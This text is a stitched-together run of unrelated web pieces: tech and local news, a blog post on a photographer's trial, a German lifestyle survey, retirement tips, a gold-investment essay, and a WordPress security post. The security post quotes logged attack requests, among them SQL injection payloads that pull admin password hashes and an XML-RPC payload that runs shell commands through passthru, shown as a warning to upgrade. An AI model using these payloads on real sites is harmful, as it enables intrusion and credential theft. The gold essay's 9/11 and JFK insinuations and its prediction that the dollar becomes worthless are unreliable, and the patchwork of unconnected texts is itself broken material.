“ The reality is that most of the time , your first effort is n’t right .
You have to go through another design cycle .
That can take ten years . ”
It is surprising that Montalvo did n’t find a savior that could keep it going .
Jen -Hsun Huang , ( pictured left ) CEO of graphics chip maker Nvidia , recently harangued Intel for saying that the tasks performed by graphics chips would eventually be subsumed by Intel ’s chips .
No one would benefit more from owning a microprocessor design team than Nvidia .
But , asked why he did n’t buy Montalvo , Huang said that he would rather create more interesting chips internally .
( He did n’t offer a clue as to what those chips might be ) .
“ You know me , Dean , ” he said .
“ I think things through .
Why would I want to do that ?
I could just hire their engineers . ”
Nvidia only hired a tiny number of Montalvo people , including Laurent Moll , Montalvo ’s SOC architect .
As Montalvo ran out of cash , Sun Microsystems bought the assets ( including patent applications ) for an undisclosed price , but the Register reported it paid a little more than $ 5 million .
( Apparently , it ’s more than $ 10 million ) .
Sun has hired more than 100 of the engineers , led by Perry .
Sun got most of the local team and only a few of those in India .
But some key talent has n’t joined .
Favor chose not to go to Sun .
Sun could use the technology to keep Intel at bay .
The server maker designs its own Sparc chips but also buys from Intel and AMD .
One of its intriguing options is to use Montalvo ’s team to create a server chip with both Sparc and Intel cores on the same chip .
That could give customers options for running a variety of software on their servers .
Sun could also do its own x86 chip .
But it could take a few years for such a design to materialize .
It remains to be seen whether anyone else will try to create an x86 startup to compete against Intel .
But such an effort could take hundreds of millions of dollars , as Montalvo showed us .
And it will only get more expensive over time .
The target remains juicy , but elusive .
Dham said only that it was a noble attempt .
Glaskowsky posted on his blog that he hopes to get permission to tell the story of Montalvo one day .
So far , he has n’t received it .
Ever the Silicon Valley optimist , Glaskowsky believes someone will be able to compete against Intel and AMD in the next five years .
“ If it was up to me , I would try again tomorrow , ” he said .
“ I know we could do much better . ”
Carlos Miller , who was arrested in Miami for taking pictures on a public street , had his opening day in trial yesterday .
And the prosecutor in the case not only asked the judge to bar him from blogging about the trial , but brought a photo of Miller into evidence , noting that it showed him wearing his hat backward , gangster - style .
From Miller 's blog :
You know the prosecutor is desperate when he asks the judge to order me to stop blogging about my case .
Judge Jose Fernandez did not even want to hear it , overruling him in seconds .
The prosecutor , Ignacio Vazquez , told the judge that by me proclaiming my innocence on a public forum , I am in danger of jeopardizing the judicial procedure .
When that did n’t work , he tried to introduce the photo below as evidence , which he plucked from my blog , pointing out that I am wearing my cap backwards , as if that proves I am a reckless Photo Gangster .
Here 's the photo :
I believe his t- shirt says " Raging Liberal . "
Arrest that man !
Unbelievable stuff .
Carlos is going to prevail in this thing , I can feel it .
He 's also becoming a Pulp hero .
-- Also today I wanted to highlight some good recent work that has happened despite the turmoil at the Miami Herald .
" Taken For A Ride , " a series on mismanagement in Miami - Dade Transit by Larry Lebowitz .
It 's a detailed look at government ineptitude -- with hundreds of millions of tax dollars wasted .
As the oil price crisis continues , it could n't have come at a better time .
-- Also , been meaning to mention that the Pulp was named " Best Blog In South Florida " by Gold Coast Magazine ( and other glossy mags owned by the Gulfstream Media Group , which include Boca Life and Palm Beacher ) .
Also , a certain journo involved with said blog who shall go unnamed here was called " Best Columnist . "
Some of the other honorees on the same page -- including Donald Trump and H. Wayne Huizenga -- were a bit suspect , but it 's still an honor .

A Golden Parachute With a Silver Lining By Darryl Robert Schoon
Jul 22 2008 11:03 AM www.drschoon.com AN ESCAPE ROUTE IN A TIME OF DISASTER
Only those who have gone too far know where the limits should have been Money served throughout history as a medium of exchange and as a storehouse of value .
But when gold and silver coins were replaced by paper currencies , money no longer was the same .
Paper money , no longer having intrinsic value , now functions only as a medium of exchange , a function that degrades over time .
The value of paper money continually loses value because the constant printing of paper money constantly dilutes the value of previously printed money .
The more paper money printed , the less paper money is worth ; and today , money is being printed at a faster rate than at any time in history .
In fiat paper money systems , today ’s paper money will be worth less than tomorrow ’s and will be worth less the day after ad infinitum .
This constant degradation of paper money is known as inflation .
When the process rapidly speeds up , it is known as hyperinflation .
Remember that word .
For the first time in history , all money , all currencies are now fiat which means money no longer has intrinsic value .
This is not because intrinsic value was deemed unnecessary for a functioning currency .
The real reason is far less reasonable .
All money is now fiat because between 1949 and 1970 the US overspent its entire 21,775 ton hoard of gold and could no longer convert its currency to gold as agreed under the Bretton Woods Agreements in 1944 .
Note :
What gold remains in US custody today remains only because in 1971 the US refused to transfer the remaining gold owed to others ; as its obligations were far greater than its capacity to settle .
Because at the time the gold - backed US currency anchored all world currencies , when the US dollar became fiat , all currencies also became fiat .
For the first time in history , no currency was backed by either gold or silver including the international reserve currency , the US dollar .
The destructive consequences of that act have remained contained for 35 years .
They are no longer .
The sudden global switch from gold backed money to fiat paper money was not by design ; it was the by - product of excessive US post - WWII military spending and corporate overseas expansion .
Throughout history , the downfall of most paper money economies can be directly tied to wars and the military .
The US is no exception .
The late central banker John Exter called today ’s money IOU - nothing money , the best description yet of today ’s constantly degrading paper currencies .
Trillions of dollars are bet daily on FOREX markets as speculators bet on the value of government issued coupons masquerading as money .
Someday , perhaps sooner than later , speculators will bet the coupons have no value at all .
THE DAY GOLD CORNERS PAPER MONEY
On that day , according to Professor Antal E. Fekete , a spontaneous gold corner could develop ; but the corner would not be driven by speculators cornering a commodity to drive up its price .
The corner will be caused by the refusal of those who own gold to exchange their increasingly precious metal for increasingly worthless paper currencies .
Since 1913 when the Federal Reserve first issued its debt based paper money in the US , the paper US dollar has lost 95 % of its value , a loss of 95 % over 95 years .
Perhaps in five more years , 100 years after the creation of the Federal Reserve , the US dollar will have lost 100 % of its value — which means in five years the US paper dollar will be worth nothing .
Throughout history , no fiat money system has stood the test of time .
All attempts to substitute paper money for gold and silver have ended in the total destruction and debasement of the currency .
This time will be no different .
It is hubris to think otherwise but unfortunately the vast majority do — which is a clear sign they ’re not thinking at all .
ALAN GREENSPAN’S REAL CONUNDRUM THE GAME IS OVER WHEN PAPER MONEY LOSES ITS VALUE
This is the real conundrum of Alan Greenspan and all central bankers .
When paper money loses its value , it can no longer function as a medium of exchange .
Today , money is losing value faster than at any time in recent history .
The end game , the end of fiat money in our time is approaching .
Inflation is reflected not only in the increasing costs of goods and services , it ’s reflected in the corresponding decline in the value of paper money ; and as money increasingly loses value , commodities , e.g. gold , silver , oil , gas , food etc. inversely become increasingly expensive measured in depreciating currencies .
Hyperinflation is merely an extended condition of inflation .
In a hyperinflation , the value of paper money declines so quickly that costs rise exponentially in shorter and shorter periods of time .
The end cycle of paper currencies is first inflation , then hyperinflation , then the collapse and destruction of the currency .
Today , inflation is rising everywhere as central bank printing of money is increasing everywhere .
Hyperinflation is now a distinct possibility even as deflationary forces , sic collapsing and slowing demand , are themselves also in motion .
Inflation and deflation are not mutually exclusive phenomena as they have been in the past .
Even now , we are experiencing higher prices along with decreasing demand , sic. stagflation .
Stagflation is merely a less virulent version of the unthinkable — a simultaneous hyperinflationary deflationary collapse .
We are at a critical moment in history .
Never before has money been debased on such a grand scale .
Never before has so much debt been owed and never before have monetary authorities been so helpless to control the destructive forces they themselves set in motion .
THE FUTURE SOVEREIGN DEFAULT
While it may appear to most that we are having a credit crisis or a liquidity crisis or a solvency crisis etc. , the actuality is that we are having a monetary crisis — a crisis whose root cause is the increasingly pathological state of money itself .
Money is a medium of exchange and a storehouse of value .
When money no longer serves those functions , its usefulness is over ; and while the experience will be new to us , it will not be new to others .
History is littered with cast - off currencies , discarded attempts by nations to pay for excessive government expenditures with increasing amounts of paper money , sourced from an apparently limitless supply of paper , ink and human hubris ; and while such are indeed limitless , the tolerance of such is not .
Economists Kenneth Rogoff ( Harvard ) and Carmen Reinhart ( University of Maryland ) have recently done seminal research in this area .
Their findings are a disturbing sign of what now lies directly ahead .
Sovereign currency collapse and defaults are not uncommon , they come in waves .
Sovereign defaults come in waves and while the present trough has been unusually quiescent , the future may not be so kind .
What lies ahead may be the mother of all monetary defaults — because for the first time in history , all currencies including the world reserve currency are fiat ; and , when the US dollar , the lynchpin of the current fiat regime collapses , all currencies may fall as well .
The very ubiquity of paper money portends a level of economic chaos never before experienced .
All nations are now using paper money without the constraint and backing of gold or silver .
Indeed , that is the very reason why governments substitute limitless paper for limited supplies of gold and silver .
The ambitions of government are always greater than their resources , especially when it comes to war and geopolitical ambitions .
Since the end of WWII , the US has spent more money on its military than any nation in history .
EISENHOWER ’S PROPHECY Retired US General Dwight D. Eisenhower was President of the United States from 1953 to 1961 .
In 1961 , in his historic farewell address to the nation , Eisenhower , a highly decorated general and former Supreme Commander of the Allied Forces in Europe , took the unprecedented step of warning America about the dangerous influence of what he called the military - industrial complex .
Our military organization today bears little relation to that known by any of my predecessors …
Until the latest of our world conflicts , the United States had no armaments industry .... [ Now ]
We annually spend on military security more than the net income of all United States corporations .
This conjunction of an immense military establishment and a large arms industry is new in the American experience .
The total influence -- economic , political , even spiritual -- is felt in every city , every State house , every office of the Federal government … In the councils of government , we must guard against the acquisition of unwarranted influence , whether sought or unsought , by the military industrial complex .
The potential for the disastrous rise of misplaced power exists and will persist .
Eisenhower ’s prophetic warnings went unheeded ; and today , the US and the world will bear the consequences .
Throughout history , war and military expenditures have been the leading cause of currency collapse and history is about to repeat itself .
The past is again prologue .
Since WWII , the US government has spent money like it grew on trees and now unfortunately it literally does ( albeit with the addition of a bit of ink and issuance from a central bank ) ; and as President of the United States for eight years , Eisenhower clearly understood the consequences of continued US profligacy .
… As we peer into society 's future , we -- you and I , and our government -- must avoid the impulse to live only for today , plundering , for our own ease and convenience , the precious resources of tomorrow .
We cannot mortgage the material assets of our grandchildren without risking the loss also of their political and spiritual heritage .
We want democracy to survive for all generations to come , not to become the insolvent phantom of tomorrow .
Unmindful of Eisenhower ’s warning , the US accelerated its spending and now its assets are mortgaged beyond of the ability of America ’s grandchildren ’s to pay .
Since Eisenhower ’s presidency , the US has gone from being the world ’s only creditor to the world ’s foremost debtor .
In but five decades , the US squandered not only its extraordinary patrimony ( 21,775 tons of gold ) , but the income and assets of future generations .
Today US obligations , in excess of $ 70 trillion , are incapable of ever being paid back .
During the Eisenhower presidency , the US was the wealthiest nation and most productive economy in the world .
Now , only five decades later , the US has become the insolvent phantom of which Eisenhower warned .
EISENHOWER ’S LONG AWAITED ANSWER
For fifty years , we in America have proceeded down an aisle of destruction without meaningful debate or concern for the consequences .
Neither the press nor the nation ’s scholars addressed and pressed the issues that would someday destroy the economy of the most powerful nation in the world — and many of us in the US have wondered why .
In his farewell address to the country in 1961 , Eisenhower gave the answer to that question .
It is not , as I had feared , that Americans by nature are not inquiring , or are too afraid to ask hard questions , or are unable to accept uncomfortable truths .
Americans have not asked critical questions because those in positions of authority have been bribed not to do so .
Eisenhower ’s answer is as follows : … A steadily increasing share [ of research ] is conducted for , by , or at the direction of , the Federal government … the free university , historically the fountainhead of free ideas and scientific discovery , has experienced a revolution in the conduct of research .
Partly because of the huge costs involved , a government contract becomes virtually a substitute for intellectual curiosity …
The prospect of domination of the nation 's scholars by Federal employment , project allocations , and the power of money is ever present .. and is gravely to be regarded … we must also be alert .. that public policy could itself become the captive of a scientific technological elite .
Issues such as the legality of the Federal Reserve Bank , or the transformation of America into a quasi - police state ( the US is now the world ’s number one jailor ) , or the inability to demand answers to questions such as why thousands of put options were placed just prior to 9/11 — bets on shares of American and United Airlines ( the planes involved in the 9/11 ) ) and on Morgan Stanley and Merrill Lynch ( occupants of the World Trade Center ) have not been asked or answered by those in authority and control .
The put options were traced to former US investment firm , A.E. Brown now a unit of Deutsche Bank .
Perhaps it is only coincidence that in 1997 , A. E. Brown was headed by Buzz Krongard who in 1998 became counsel to CIA Director George Tenet and in 2001 was appointed to the number three position of Executive Director of the CIA .
Perhaps such are coincidence , perhaps they are not .
What we do know is that we do not know — that such relevant and important questions have been assiduously avoided by the Congress , the press , and the nation ’s scholars .
But , now , because of Eisenhower ’s words we now know why today meaningful public inquiry is non-existent in America — it has been bought and paid for with US taxpayer dollars .
Seen in the light of the founding fathers ’ dreams , the US is a failed experiment ; and while it is true the experiment is not yet over , it may be uncomfortably close to its end .
It is important to remember that not all experiments turn out as intended .
America ’s debased democratic process has shown itself woefully impotent to resist the powers of which President Eisenhower so presciently and explicitly warned — powers so dangerously formidable that Eisenhower spoke of them only days before he was to leave office .
His successor , President John F. Kennedy was not to be so lucky .
Just six months after authorizing US dollars to be backed by silver bullion instead of debt - based money from the Federal Reserve , JFK was killed by a " lone gunman " whose bullet followed a route almost as circuitous as the Warren Commission ’s pathetic attempts to explain his assassination to a grieving and unquestioning nation .
Time has shown Eisenhower to be a prophet ignored by the nation he led .
The future he warned about is now here and , unfortunately , so , too , are we .
It would be a tragedy if the sacrifices of previous Americans and the founding fathers were to end like this .
THE GOLDEN PARACHUTE WITH A SILVER LINING
Because the root problem is monetary in nature , so , too , is the cure .
Because paper money is the cause , real money , e.g. gold and silver , is the answer .
This is true for nations as well as individuals .
We can protect ourselves from the economic chaos that is about to happen if we possess gold or silver and faith — the first two can be bought , the latter cannot .
Throughout history , whenever a currency collapse occurs , in the ensuing chaos gold and silver can be exchanged for goods and services .
It will be no different if and when this happens again in the not too distant future .
In July when Martha and I were in Hungary attending Session IV of Professor Fekete ’s Gold Standard University Live ( GSUL ) , we saw a branch of .
Erste Bank , an Austrian bank , in the town of Szmobathely where GSUL was being held .
Just days before while sitting on the tarmac in Austin , Texas , waiting for our plane to be refueled , I had read a well researched in - depth report on gold forwarded to me by Ronald - Peter Stöferle of Erste Bank , headquartered in Vienna .
Stöferle ’s report is one of the best technical overviews on gold that I have recently read .
Its analysis of gold ’s history and future in relevant sectors , e.g. mining , bullion , central banks etc , is both focused and far - reaching , a not inconsiderable feat .
Quite positive about gold ’s prospects , the title of Erste Bank ’s analysis reads : Special Report : Gold — A Shiny Outlook .
The report concludes : Secular bull market still intact
Strongly increased investor interest in 2008 and beyond
Central banks will want to achieve a higher degree of diversification of their dollar holdings
Necessary correction following an overbought scenario
First target price : $ 1,200 : long term target : inflation - adjusted all - time high of $ 2,300
It is now one year after August 2007 when the historic credit contraction shook the confidence of global financial markets .
Today , the ground still appears firm beneath our feet .
It is not .

**** Note : Session V of Professor Fekete ’s Gold Standard University Live ( GSUL ) will held November 11th through the 14th at Australian National University in Canberra , Australia .
I will be delivering a talk during the session .

September 24 , 2020
We must work to establish institutional cultures that look , feel and are as much as possible like the just world we profess to value , writes Larry E. Davis .
Damian Conway , Perl expert extraordinaire , Open Source luminary and long - time friend of the Toronto Perl Mongers , will deliver — free and to the public — one of his signature tour - de - force completely insane talks that is …
1/3 high - end IT ,
1/3 showmanship ,
and 1/3 peyote - fuelled hallucination .
Tonight will be the world premiere of a new talk , which goes under the title of Temporally Quaquaversal Virtual Nanomachine Programming in Multiple Topologically Connected Quantum - Relativistic Parallel Timespaces … Made Easy .
As with the fanciful titles of his other talks , it ’s hard to tell what it ’ll actually be about , but having seen a couple of his presentations , I can guarantee that it will be a slightly - askew look at technology done in an engaging and hilarious fashion .
Better still , you ’ll be the first to see this presentation , which is a dress rehearsal for the O’Reilly Open Source Conference taking place later this month in Portland , Oregon .
Best of all , unlike the people at the Open Source Conference who ’ll have to shell out something in the neighbourhood of $ 2000 , admission to this event is absolutely free .
( They will be taking up a collection for Damian in order to provide him some sort of honorarium for his doing the presentation , and some of the DemoCamp money is also going to Damian ) .
If you ’d like to catch this event ( I ’ll be there ) , it ’s tonight at the Bahen Centre for Information Technology , which is on 40 St. George Street ( just north of College ) , right in the middle of the University of Toronto campus .
As I like to say for this sort of event : be there and be square !
He sleeps in pyjamas , paints his walls yellow and over a year drinks 540 glasses of alcohol and has sex with his wife 117 times , as well as having erotic dreams 15 times a month .
She wears nighties to bed , likes baking , orchids and piling cuddly toys on the back of the sofa .
She also has sex with her husband 117 times a year , consumes a total of 229 alcoholic beverages and dreams about sex five times a month .
Together they have one child and shop at discount supermarkets such as Aldi or Lidl , three of which are located just five minutes away from their house .
Meet Mr and Mrs Average of Germany , whose profiles have been unveiled following the most comprehensive study ever to be carried out into the ' typical German ' .
Offering a unique insight into what makes Germans tick , the study by Der Spiegel magazine has revealed that , despite Germans ' oft - expressed desire to be different , the behaviour of most is in fact highly predictable .
Gathering its data from statistics , opinion polls , home interviews and sales information , it concludes that the nation is more homogeneous than it has ever been .
The average Teuton family goes on holiday for two weeks a year , mainly within Germany , although their favourite destination is Majorca .
He ( 45 years old ) is 5ft 10 in , she 5ft 5in .
He is invariably overweight ( 83.5 kg ) while she ( 67 kg and 42 years old ) has mid-length hair , has sole responsibility for running the household and likes horoscopes and diet books .
They both like Harry Potter .
Their favourite dishes - and these have not changed for years , despite globalisation 's influence on the wide range of items now available - are lentils , curry wurst ( sausage covered in curry powder and ketchup ) and spätzle - egg pasta and schnitzel .
The benefits of the study are not immediately obvious , apart from informing advertisers and politicians about their audience .
But the results are fascinating , revealing such an overwhelmingly uniform society that they have prompted fears that the country has fallen into a pit of monotony and dullness .
It has come as a shock to Germans to find that , while they might think they are being refreshingly individualistic , they are actually , in large part , leading parallel lives .
' The situation is paradoxical , ' commented Der Spiegel in a cover story that was dedicated to ' the average German ' .
' In an age when total individuality is celebrated by some and painted as the source of all evil by others , a creeping uniformity is taking hold .
' We make our decisions far more uniformly than we believe , some stemming from forced necessity and others reached completely of our own free will .
Even the greatest individualist , convinced that he is one of a kind , measures his happiness against the average person . '
The extraordinarily detailed survey , which delves into everything from the average car colour to the size of the average bathroom , to how often Germans masturbate and when they get up , and even what direction they take when they enter a supermarket , paints a portrait of a society which yearns for familiarity and for the necessities of life to be close to hand .
Alarmingly , it does not appear to be one which particularly craves innovation , novelty or new climes .
The picture is all the more surprising since recent studies have shown the gap between rich and poor in Germany to be growing , slowly eroding the classless society of which Germans are so proud .
While an obvious effect of this might be more divergent tastes , the opposite appears to be the case .
But as the study 's authors suggest , it could be that Germans like being average because it signals stability and peace .
A country which for years was defined by its warmongering attitude might actually consciously yearn for ennui , they suggest .
Germans even have a nickname for being average , ' null-acht - fünfzehn ' - ' 08/15 ' - the name of the standard - issue machine - gun used by Wehrmacht soldiers in the Second World War .
The study concludes that ' after turbulent centuries and catastrophic decades we have arrived in a state of a moderate , average democracy ' , in which being ' lost in the crowd ' and ' public order ' are in fact what citizens most desire .
What comes out in the end is a portrait of a people who are well - fed , well - educated , fairly satisfied and generally modest .

· The following clarification was printed in the Observer 's For the record column , Sunday June 1 2008 .
We described ' 08/15 ' as ' the name of the standard - issue machine - gun used by Wehrmacht soldiers in the Second World War ' .
The MG08/15 , based on the Maxim series of machine guns , was deployed by Germany in the First World War .
It was only used in the Second World War where there was a shortage of the newer MG34 and MG42 by which it had been supplanted .
John McCain and Barack Obama have both changed positions in this campaign .
That 's OK .
Voters understand that politicians can and , sometimes , should change their views .
After all , voters do .
Witness the wide swings in their answers to opinion polls .
But before accepting the changes , voters typically ask themselves three questions :
Does the candidate admit he 's shifting ?
What 's the new information that altered his thinking ?
Does the change seem reasonable and not calculating ?

FRANKFURT , April 4 ( Reuters ) - T - Mobile has slashed its price in Germany for the most basic version of Apple Inc's AAPL.O iPhone to 99 euros ( $ 155 ) from 399 euros ahead of the expected launch of a new model .
In an offer posted on Friday on its Website ( tinyurl.com / 29 pokf ) , T - Mobile said it would sell the 8 gigabyte version for as little as 99 euros together with a two - year contract costing 89 euros a month from April 7 through June 30 .
The 16 gigabyte version will continue to cost 499 euros , in conjunction with a minimum 49 euros - per - month two - year contract .
Apple is expected to launch later this quarter a third - generation , high - speed version of the iPhone , which propelled it into 10th place in global handset vendor rankings in the fourth quarter of 2007 after its launch at the end of June .
Bank of America analysts expect Apple to produce as many as 8 million of the new iPhones in the third quarter .
Apple itself has said it expects to have sold 10 million iPhones in total by the end of 2008 .
Deutsche Telekom DTEGn.DE said at the end of January it had sold 70,000 iPhones since they went on sale in Germany at the beginning of November , but has given no update since .

Remember a few weeks ago there was all that noise about WordPress blogs getting hacked ?
Remember how everyone was urged to upgrade their blogs .
You did upgrade did n’t you ?
No ?
It was inevitable that you ’d be hacked .
If you have n’t been hacked yet , it ’s only a matter of time .
Unfortunately for some who did upgrade , it was too late .
The hacker slimeballs may have known about the security issues before we did and went about their merry way breaking into blogs and websites , grabbing usernames and passwords , and planting backdoor scripts to log them in again at a later date .
That ’s how even diligently upgraded blogs were hacked .
The bad guys got there before you .
In the last week the hackers have started again .
There is no zero day WordPress exploit .
There is no evidence that version 2.5.1 of WordPress is vulnerable to any exploit at this time .
They ’re using the old exploits all over again .
This time they ’re redirecting hits from Google to your blog .
Those hits are instead being redirected to your - needs .
info and anyresult.net
If you ’ve been hacked
Upgrade to the latest version of WordPress .
Make sure there are no backdoors or malicious code left on your system .
This will be in the form of scripts left by the hacker , or modifications to existing files .
Check your theme files too .
Change your passwords after upgrading and make sure the hacker did n’t create another user .
Edit your wp - config.php and change or create the SECRET_KEY definition .
It should look like this , but do not use the same key or it wo n’t be very secret , will it ?
define (‘ SECRET_KEY ’ , ‘1234567890 ’ ) ;
Hidden Code
The bad guys are using a number of ways to hide their hacks :
The simplest way is hiding their code in your php scripts .
If your blog directory and files are writable by the webserver then a hacker has free reign to plant their code anywhere they like .
wp - blog - header .php seems to be one place .
Theme files are another .
When you upgrade WordPress your theme files wo n’t be overwritten so make sure you double check those files for any strange code that uses the eval ( ) command , or base64_decode ( ) .
Here ’s a code snippet taken from here :
< ?php Another hack adds different code to your php files .
Look for k1b0rg or keymachine .
de in your php scripts and remove that offending code if you find it .
command , or .
Here ’s a code snippet taken from here :
Check your .htaccess file in the root of you blog .
If you ’ve never edited it , it ’ll should look like this :
# BEGIN WordPress
< ifmodule mod_rewrite .c>
RewriteEngine On
RewriteBase /
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [ L ]
</ifmodule >
# END WordPress
That file may have this chunk of code too which is to do with the uploader : < ifmodule mod_security .
c >
< files async-upload.php >
SecFilterEngine Off
SecFilterScanPOST
Off
</ files >
</ifmodule >
They ’re also uploading PHP code disguised as jpeg files to your upload directory and adding those files to the activated plugins list .
This makes it harder to find them , but not impossible : Open PHPMy Admin and go to your blog ’s options table and find the active_plugins record .
Edit that record .
It ’s a long line .
Scroll through it and you ’ll find an entry that looks like ../ uploads/2008/05/04/jhjyahjhnjnva.jpg .
Remove that text , and make sure you remove the serialized array information for that array record .
If that ’s beyond you , just delete the active_plugins record and reactivate all your plugins again .
Check your uploads directory for that jpg file and delete it .
This Youtube video shows how to do that .
I do n’t think there ’s any urgent need to remove the rss_* database record but it wo n’t hurt to do it .
Change Your Passwords
Once you ’ve upgraded and verified that your install is clean again you must do the following :
Change the passwords of all users on your system .
Make sure the hacker has n’t added another user account he can use to login again .
Stop the bad guys
One way of stopping the bad guys before they ’ve done any major damage is by doing regular backups and installing an intrusion detection system ( IDS ) .
I use Backuppc to backup all my servers every night , and a simple MySQL backup script to dump the database daily .
The first IDS that springs to mind is Tripwire but there are many others .
I just installed AIDE to track changes on this server .
What it does is give me a daily report on files that have changed in that period .
If a hacker has changed a script or uploaded malicious code I ’ll get an email within a day about it .
It does take some fine tuning , but it ’s easy to install on Debian systems ( and presumably as easy on Ubuntu and Red Hat , and even Gentoo .. ) :
# apt - get install aide
# vi /etc/aide/aide.conf.d/88_aide_web
# /usr/sbin/aideinit
In the configuration file above I put the following : / home / web / Checksums
!/home/www/logs/.*
!/home/web/public_html/wp-content/cache/.*
!/home/web/.*/htdocs/wp-content/cache/.*
That will tell AIDE to track changes to my web server folders , but ignore the logs folder and cache folders .
Please Upgrade
There is absolutely no reason not to upgrade .
WordPress is famous for it ’s 5 minute install , but it takes time and effort to maintain it .
If you do n’t want the hassle of upgrading , or do n’t know how to maintain it , why not get a hosted WordPress account at WordPress.com ?
Does the $ 10 you make from advertising every month really justify the time it takes to make sure your site , your writing , your photos and other media are safe ?
This is n’t an advert for WordPress.com , go with any blogging system you like , but do n’t make life easy for the scum out there who ’ll take over your out of date software and use it to their advantage .
Help a friend
Check the source code of the blogs you read .
The version number in the header will quickly tell you if their version of WordPress is out of date or not .
Please leave a comment encouraging them to upgrade !
The version number looks like this :
< meta name= ” generator ” content = ” Word Press 2.5.1 ″ /> <! – leave this for stats –>
What does a hack look like ?
I perform logging on one of my test blogs and I come across all sorts of malicious attempts to break in .
Attackers use dumb bots to do their bidding so a website will be hit with all sorts of attacks , even for software that ’s not installed .
The bots are so dumb they ’ll even come back again and again performing the same attacks .
Here ’s what I call the “ ekibastos attack ” .
It happens over a number of requests and I ’ve seen it come from 87.118.100.81 on a regular basis .
It uses a user agent called , “ Mozilla / 4.0 ( k1b compatible ; rss 6.0 ; Windows Sot 5.1 Security Kol ) ” which strangely enough does n’t show up on Google at all right now .
First the attacker visits your Dashboard , and then without even checking if that was successful , he tries to access wp - admin / post .
php several times using HEAD requests .
Then he POSTs to wp - admin / admin-ajax .php with the following POST body :
POST : Array
(
Content not available .
Please allow cookies by clicking Accept on the banner => wordpressuser_c73ce9557defbe87cea780be67f9ae1f=xyz%27 ; wordpresspass_c73ce9557defbe87cea780be67f9ae1f=132 ;
)
When that fails , he grabs xmlrpc.php .
He then POSTs to that script , exploiting an old and long fixed bug .
Here ’s a snippet of the data .
HTTP_RAW_POST_DATA : <?xml version = ” 1.0 ″ ?> < methodCall > < methodName>system.multicall</methodName > < params > < param >< value >< array > < data > < value >< struct > < member >< name>methodName</name >< value >< string>pingback.extensions.getPingbacks</string></value></member> < member >< name > params</name >< value >< array >< data > < value >< string >
http://ocaoimh.ie/category/&post_type=%27)
UNION ALL SELECT 10048,2, 3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4 FROM wp_users WHERE ID=1%2F *</ string ></value >
</data></array></value></member></blockquote>
That fails too so the query is repeated with similar SQL .
< value >< string > http://ocaoimh.ie/category/&post_type=%27) UNION ALL SELECT 10000%2Bord( substring (user_pass,1,1 ) ) , 2, 3,4,5,6,7,8,9,0,
1,2,3,4,5,6,7,8,9,0,1,2,3,4 FROM wp_users WHERE ID=1%2F *</ string ></value>
Then he tries a trackback :
URL : /wp-trackback.php?tb_id=1
POST : Array
(
[ title ] => 1
[ url ] => 1
[ blog_name ] => 1
[ tb_id ] => 666666 \’
[ 1740009377 ] => 1
[ 496546471 ] => 1
)
And another trackback :
URL : /wp-trackback.php?p=1
POST : Array
(
[ url ] => ekibastos
[ title ] => ekibastos
[ excerpt ] => ekibastos
[ blog_name ] => + AFw-\’ ) /*
[ charset ] => UTF - 7
)
Before finally going back to xmlrpc.php with this POST request :
<?xml version = ” 1.0 ″ ?>
< methodCall >
< methodName>pingback.ping</methodName >
< params >
< param >< value >< string > k1b0rg ’ icq : 76-86-20</string></value ></ param >
< param >< value >< string >
http://ocaoimh.ie/?p=k1b0rg#ls</string></value></param>
< param >< value >< string > admin</string></value></param >
</ params >
</methodCall >
In between , he also tries the following GET requests :
GET /index.php?cat=%2527+UNION+SELECT+CONCAT(666,CHAR(58 ) , user_pass,CHAR(58),666,CHAR(
58 ) ) +FROM+wp_users+where+id=1/*
HTTP/1.1
GET /index.php?cat=999+UNION+SELECT+null,CONCAT( 666,CHAR(58 ) , user_pass,CHAR(58),666,CHAR( 58 ) ) , null, null,null+FROM+wp_users+where+id=1/*
HTTP/1.1
Thankfully I upgraded and all those attacks fail .
Those requests have been hitting me for months now with the latest happening 2 days ago .
If that does n’t convince you that you must upgrade and check your website , I do n’t know what will .
PS .
For completeness , here ’s another common XMLRPC attack I see all the time .
Ironically , this actually hit my server from 189.3.105.2 after I published this post .
<?xml version = " 1.0 " ?> < methodCall > < methodName>test.method </methodName > < params > < param > < value > < name > ' , '' ) ) ; echo ' ______BEGIN______' ; passthru ( 'id ' ) ; echo ' _____FIM_____ ' ; exit;/*</name></value> </ param > </ params > </methodCall >
Edit : Tripwire url fixed , thanks Callum

( Natural News )
Two of the reservoirs supplying the city of Los Angeles with potable water were shut down when an independent laboratory test revealed them to be contaminated with high levels of the carcinogen bromate .
An independent commercial customer conducted laboratory tests on the content of water from the Silver Lake and Elysian reservoirs in October , discovering bromate levels of 68 and 106 parts per billion , respectively .
The maximum average bromate exposure allowed by law is 10 parts per billion over a year .
According to Los Angeles Department of Water and Power ( LADWP ) spokesperson Joseph Ramallo , the bromate " formed unexpectedly when the water in the reservoir , combined with groundwater , was treated with chlorine and exposed to sunlight . "
He said that it was the first known case of such a reaction occurring .
When notified of the contamination , LADWP shut down the reservoirs and alerted the Department of Public Health .
The reservoirs will now be drained of their entire 600 million gallons of water .
Because Southern California is currently undergoing a drought , the department says that the water will be used for irrigation , firefighting or other non-potable uses whenever possible .
The contaminated water that cannot be used will be dumped into the Los Angeles River and will flow from there into the Pacific Ocean .
A total of 107 tanks and reservoirs compose the water storage system for the city of Los Angeles .
LADWP officials say that the city 's water supplies will not be affected by the temporary unavailability of two of these .
In addition to water use being reduced for the winter , LADWP says that the two reservoirs contain only one day 's worth of water use for the city .
Water suppliers are not required to test for bromate in drinking water , except in cases where ozone treatment is used .
The Environmental Protection Agency says that it is investigation the incident to determine if similar contamination could occur in other reservoirs , posing a public safety threat .
Most people look forward to retirement .
This is a period of life in which you can step away from the grind of daily employment and follow your dreams .
In a perfect world , everyone would be able to retire without worry or regret .
Unfortunately , many people fail to prepare financially .
To get started , you ’ll need to figure how much money you are likely to need for retirement .
It depends , of course , on how much income you will require in retirement and how much debt you have .
It could be possible to retire if you are willing to live a " careful " -- but not lavish -- lifestyle .
You are required to begin taking IRA distributions in the calendar year following the year you turn 70 ½ .
Your IRA administrator can calculate the proper distribution amount for you .
The annual distribution is usually about 4 % of the account balance at the beginning of the year .
If you have the money to do so , you already own your home and can live off of your retirement checks without having to chip into your savings or you can continue to increase your savings , then you 're ready for retirement .
If you are working with a disability , you would follow the process outlined in the article to determine how much you will need to save to income when you can no longer work .
Hopefully , you had purchased disability income prior to becoming disabled .
If you are unable to work , you should apply for Social Security Disability benefits .

